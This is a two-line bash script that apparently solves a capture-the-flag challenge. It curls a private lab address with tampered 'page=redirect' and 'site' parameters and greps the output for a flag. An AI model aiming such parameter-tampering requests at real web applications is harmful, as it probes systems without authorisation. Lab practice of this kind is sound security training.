#!/bin/bash
curl "http://10.0.2.15/index.php?page=redirect&site=gopa" | grep -i flag
